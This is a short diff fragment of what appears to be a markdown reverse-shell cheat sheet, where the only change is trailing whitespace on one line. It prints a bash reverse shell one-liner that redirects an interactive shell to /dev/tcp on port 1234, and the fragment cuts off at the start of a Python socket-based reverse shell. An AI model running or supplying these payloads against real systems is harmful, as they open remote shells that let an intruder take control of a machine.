@@ -64,8 +64,9 @@ ____
 ____
 
 ### Reverse shell > <a name="reverse_shell_bash"></a>bash
-bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'
-
+bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'  
+  
+  
 ### Reverse shell > <a name="reverse_shell_python"></a>Python
 ```python  
 python -c 'import sys,socket,os,pty;s=socket.socket()
